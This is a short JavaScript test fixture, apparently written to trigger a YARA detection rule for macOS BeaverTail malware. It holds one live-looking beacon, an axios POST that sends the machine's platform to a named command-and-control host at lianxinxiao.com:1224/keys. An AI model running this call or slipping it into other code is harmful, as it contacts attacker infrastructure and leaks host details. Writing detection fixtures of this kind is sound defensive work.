// Inert YARA fixture for CERBER_MacOS_BeaverTail_C2_Lianxinxiao
const os = require('os');
const axios = require('axios');
const host = "http://lianxinxiao.com:1224";
axios.post(host + "/keys", { platform: os.platform() });
